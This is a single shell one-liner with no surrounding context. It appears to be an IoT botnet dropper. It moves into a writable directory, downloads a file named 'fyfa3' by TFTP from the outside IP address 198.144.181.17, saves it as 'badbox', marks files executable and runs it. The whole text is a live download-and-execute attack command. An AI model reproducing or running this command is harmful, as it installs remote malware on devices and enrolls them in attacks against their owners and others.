cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 198.144.181.17 -c get fyfa3;cat fyfa3 >badbox;chmod +x *;./badbox
